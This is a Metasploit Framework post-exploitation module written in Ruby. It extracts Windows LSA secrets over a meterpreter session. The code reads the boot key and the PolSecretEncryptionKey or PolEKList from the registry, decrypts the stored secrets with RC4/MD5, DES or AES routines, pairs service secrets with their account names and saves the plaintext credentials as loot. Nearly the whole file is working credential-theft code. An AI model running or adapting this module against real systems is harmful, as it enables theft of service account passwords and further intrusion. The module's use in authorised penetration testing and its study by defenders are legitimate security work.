##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/post/windows/priv'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post
  include Msf::Post::Windows::Priv
  include Msf::Post::Common
  include Msf::Post::Windows::Registry

  def initialize(info={})
    super(update_info(info,
      'Name'            => "Windows Enumerate LSA Secrets",
      'Description'     => %q{
        This module will attempt to enumerate the LSA Secrets keys within the registry. The registry value used is:
        HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\. Thanks goes to Maurizio Agazzini and Mubix for decrypt
        code from cachedump.
        },
      'License'         => MSF_LICENSE,
      'Platform'        => ['win'],
      'SessionTypes'    => ['meterpreter'],
      'Author'          => ['Rob Bathurst <rob.bathurst@foundstone.com>']
    ))
  end

  def capture_lsa_key(bootkey)
    begin
      #print_status("Getting PolSecretEncryptionKey...")
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolSecretEncryptionKey", KEY_READ)
      pol = ok.query_value("").data
      #print_status("Got PolSecretEncryptionKey: #{pol.unpack("H*")[0]}")
      ok.close
      print_status("XP compatible client")
      @vista = 0
    rescue
      #print_status("Trying 'V72' style...")
      #print_status("Getting PolEKList...")
      ok = session.sys.registry.open_key(HKEY_LOCAL_MACHINE, "SECURITY\\Policy\\PolEKList", KEY_READ)
      pol = ok.query_value("").data
      #print_good("Pol: #{pol.unpack("H*")[0]}")
      ok.close
      print_status("V/7/2k8 compatible client")
      @vista = 1
    end

    if( @vista == 1 )
      lsakey = decrypt_lsa(pol, bootkey)
      lsakey = lsakey[68,32]
      #print_good(lsakey.unpack("H*")[0])
    else
      md5x = Digest::MD5.new()
      md5x << bootkey
      (1..1000).each do
        md5x << pol[60,16]
      end

      rc4 = OpenSSL::Cipher::Cipher.new("rc4")
      rc4.key = md5x.digest
      lsakey  = rc4.update(pol[12,48])
      lsakey << rc4.final
      lsakey = lsakey[0x10..0x1F]
    end
    return lsakey
  end

  def decrypt_secret(secret, key)

    # Ruby implementation of SystemFunction005
    # the original python code has been taken from Credump

    j = 0
    decrypted_data = ''

    for i in (0...secret.length).step(8)
      enc_block = secret[i..i+7]
      block_key = key[j..j+6]
      des_key = convert_des_56_to_64(block_key)
      d1 = OpenSSL::Cipher::Cipher.new('des-ecb')

      d1.padding = 0
      d1.key = des_key
      d1o = d1.update(enc_block)
      d1o << d1.final
      decrypted_data += d1o
      j += 7
      if (key[j..j+7].length < 7 )
        j = key[j..j+7].length
      end
    end
    dec_data_len = decrypted_data[0].ord

    return decrypted_data[8..8+dec_data_len]

  end

  def decrypt_lsa(pol, encryptedkey)

    sha256x = Digest::SHA256.new()
    sha256x << encryptedkey
    (1..1000).each do
      sha256x << pol[28,32]
    end

    aes = OpenSSL::Cipher::Cipher.new("aes-256-cbc")
    aes.key = sha256x.digest

    vprint_status("digest #{sha256x.digest.unpack("H*")[0]}")

    decryptedkey = ''

    for i in (60...pol.length).step(16)
      aes.decrypt
      aes.padding = 0
      xx = aes.update(pol[i...i+16])
      decryptedkey += xx
    end
    vprint_good("Dec_Key #{decryptedkey}")

    return decryptedkey
  end


  def reg_getvaldata(key,valname)
    v = nil
    begin
      root_key, base_key = client.sys.registry.splitkey(key)
      open_key = client.sys.registry.open_key(root_key, base_key, KEY_READ)
      vprint_status("reading key: #{key}#{valname}\n")
      v = open_key.query_value(valname).data
      open_key.close
    rescue
      print_error("Error opening key!")
    end
    return v
  end


  #Decrypted LSA key is passed into this function
  def get_secret(lkey)
    sec_str = "\n"

    #LSA Secret key location within the register
    root_key = "HKEY_LOCAL_MACHINE\\Security\\Policy\\Secrets\\"

    key_arr = meterpreter_registry_enumkeys(root_key)

    key_arr.each do |keys|
      mid_key = root_key + "\\" +  keys
      sk_arr = meterpreter_registry_enumkeys(mid_key)
      sk_arr.each do |mkeys|
        #CurrVal stores the currently set value of the key, in the case of
        #services it usually come out as plan text
        if(mkeys == "CurrVal")
          val_key = root_key + "\\" + keys + "\\" + mkeys
          v_name = ""
          sec = reg_getvaldata(val_key, v_name)
          if( @vista == 1 )
            #Magic happens here
            sec = sec[0..-1]
            sec = decrypt_lsa(sec, lkey)[1..-1].scan(/[[:print:]]/).join
          else
            #and here
            sec = sec[0xC..-1]
            sec = decrypt_secret(sec, lkey).scan(/[[:print:]]/).join
          end

          if(sec.length > 0)
            if(keys[0,4] == "_SC_")
              user_key = "HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\"
              keys_c = keys[4,keys.length]
              user_key = user_key << keys_c
              n_val = "ObjectName"
              user_n = reg_getvaldata(user_key, n_val)

              #if the unencrypted value is not blank and is a service, print
              print_good("Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n")
              sec_str = sec_str << "Key: #{keys} \n Username: #{user_n} \n Decrypted Value: #{sec}\n"
            else
              #if the unencrypted value is not blank, print
              print_good("Key: #{keys} \n Decrypted Value: #{sec}\n")
              sec_str = sec_str << "Key: #{keys} \n Decrypted Value: #{sec}\n"
            end
          else
            next
          end
        end
      end
    end
    return sec_str
  end

  # The sauce starts here
  def run

    hostname = session.sys.config.sysinfo['Computer']
    print_status("Executing module against #{hostname}")

    print_status('Obtaining boot key...')
    bootkey = capture_boot_key
    vprint_status("Boot key: #{bootkey.unpack("H*")[0]}")

    print_status('Obtaining Lsa key...')
    lsakey = capture_lsa_key(bootkey)
    vprint_status("Lsa Key: #{lsakey.unpack("H*")[0]}")

    secrets = hostname << get_secret(lsakey)

    print_status("Writing to loot...")

    path = store_loot(
      'registry.lsa.sec',
      'text/plain',
      session,
      secrets,
      'reg_lsa_secrts.txt',
      'Registry LSA Secret Decrypted File'
      )

      print_status("Data saved in: #{path}")
  end
end
